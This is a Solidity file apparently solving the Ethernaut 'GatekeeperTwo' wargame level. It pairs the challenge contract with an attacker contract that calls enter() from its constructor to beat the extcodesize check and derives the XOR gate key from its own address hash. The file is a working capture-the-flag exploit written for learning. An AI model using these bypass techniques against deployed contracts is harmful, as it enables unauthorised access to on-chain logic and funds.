pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;


  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
} 

contract Gatekeeperhack {
   
    bytes32 public mask1 =0x000000000000000000000000FFFFFFFFFFFFFFFF;
    bytes32 constant mask2 = 0xffffffffffffffff000000000000000000000000000000000000000000000000;
    bytes8 public mask3 = 0xFFFFFFFFFFFFFFFF;

    // replace following GatekeeperTwo("address") with your Ethernaut Smartcontract instance to be hacked
    GatekeeperTwo target = GatekeeperTwo(0xc9cdd7872ebb6494adb60339848b8be54ccf62c0);

 
    
    function Gatekeeperhack(){
         // gateTwo in assembly requires -> contract size == 0, it can only
         // happen if we call the function from this constructor... 
        address owner = msg.sender;
        address _gateKey = this;
        // We filter bytes8 MSB (Big Endian) from hash function (to be XOR'ed)
        bytes32 _gateKeyMasked = ((keccak256(_gateKey)) & mask1);
        // Conversion into bytes8 only taking bytes8 from MSB
        bytes8 _gateKeyMasked_chunk = bytes8(_gateKeyMasked<<((24)*8) & mask2);
 
        // gateThree have an underflow condition uint(0)-1 = FFFFF...
        // In order to get that result from dynamic operation (smartcontract address is dynamically assigned when deployed)
        // 'a' XOR 'b' = FFFFF..., where 'a' is hash (keccak256) of msg.sender=(this of type address) and 'b' needs to be guessed...
        // We can do it dynamically by
        // bytes8 (64 bits) 'b' = 'a_negation' = '!a' = 'a' XOR FFFFF...
        // The following variable will have 'b' = 'a_negation' by XOR masking:
        
        bytes8 _gateKey_hased_negation = _gateKeyMasked_chunk ^ mask3;
        // and then, gateThree being a new XOR OPERATION:
        // 'a' XOR 'b' = 'a' XOR 'a_negation' = 'a' XOR ('a' XOR FFFF....) = FFFF...

        // but that is going to happen inside gateThree the following remote call:
       
        target.call(bytes4(sha3("enter(bytes8)")),_gateKey_hased_negation);
        
    }

    
}
 
